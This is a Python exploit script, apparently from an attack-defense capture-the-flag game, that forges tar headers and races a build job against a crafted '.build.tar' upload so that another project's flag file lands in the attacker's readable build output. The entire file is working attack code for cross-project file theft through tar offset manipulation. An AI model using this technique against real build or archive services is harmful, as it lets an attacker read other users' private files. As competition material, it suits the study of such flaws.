#!/usr/bin/env python3

import struct

from starlib import *


def gen_tar_header(name: str, size: int):
    file_name = name

    # Create a tar header
    header = bytearray(512)
    struct.pack_into("100s", header, 0, file_name.encode())
    struct.pack_into("8s", header, 124, str(oct(size))[2:].encode())
    header[156] = 0x30  # Type flag (regular file)
    header[257:265] = b'0' * 8  # UID
    header[265:273] = b'0' * 8  # GID
    header[273:281] = struct.pack("<8s", b'')  # File mode (empty for simplicity)
    header[329:337] = struct.pack("<8s", b'')  # Modification time (empty for simplicity)
    header[148:156] = struct.pack("<8s", b'')  # Checksum field (initially empty)

    # Calculate and set the checksum
    header_checksum = (sum(header) + 0x20 * 8) & 0o7777
    struct.pack_into("6s", header, 148, str(oct(header_checksum)[2:]).encode())
    header[148 + 6] = 0x20  # Add a space to terminate the checksum

    return bytes(header)


def main(host: str, flag_id: str):
    project_id, filename = flag_id.split("/")
    name, fmt = filename.split(".")

    cm = CheckMachine(host)
    conn1 = cm.connect()
    conn2 = cm.connect()

    attack_project_id = "pwn1"
    attack_project_pass = cm.create_project(conn1, attack_project_id)
    cm.enter_project(conn2, attack_project_id, attack_project_pass)

    # # prepare padding file (just for clarity, can use flag/jump files instead).
    padding_header = gen_tar_header("padding_filename", 512)
    padding_content = b"a" * 512

    cm.solve_captcha(conn1)
    cm.upload(conn1, "padding", padding_header + padding_content)
    print('padding response:', conn1.recv())

    # prepare "jump" tar header in file 1.
    # upload will fail, but the file will be created anyway.

    # it should consume next two blocks (tar header & tar content).
    jump_file_size = 1024
    jump_header = gen_tar_header("jump_filename", jump_file_size)

    cm.solve_captcha(conn1)
    cm.upload(conn1, "jump", jump_header)
    print('jump header response:', conn1.recv())

    # We inject our file after 2000 random files
    # (each have tar header, tar header of underlying, and tar content),
    # plus tar header for the jump file itself
    # minus tar header itself.
    jump_offset = 512 * 3 * 2000 + 512 - 512
    start_header = gen_tar_header("start_filename", jump_offset)

    artifacts = [
        Artifact(
            source='padding',
            destination=f"padding{i}",
        )
        for i in range(2000)
    ]
    artifacts += [
        Artifact(
            source="jump",
            destination=f"jump",
        )
    ]
    artifacts += [
        Artifact(
            source_project=project_id,
            source=f'{name}.{fmt}',
            destination='target',
        )
    ]
    job = Job(steps=[Step(name="build", artifacts=artifacts)])

    cm.solve_captcha(conn1)
    cm.solve_captcha(conn2)

    cm.job(conn1, JobRequest(job=job))
    time.sleep(1)
    cm.upload(conn2, ".build.tar", start_header)

    print(conn1.recv())
    print(conn2.recv())

    print('list:', cm.list(conn1, 'build/'))
    print(cm.download(conn1, 'build/jump_filename'))


if __name__ == "__main__":
    main('127.0.0.1', '2768bdc8-c8a8-48fb-a5f5-ace18a5f81c8/ERA4s3Sv.zip')
    # if len(sys.argv) != 3:
    #     print(f"Usage: {sys.argv[0]} <host> <flag_id>")
    #     exit(1)
    #
    # main(sys.argv[1], sys.argv[2])
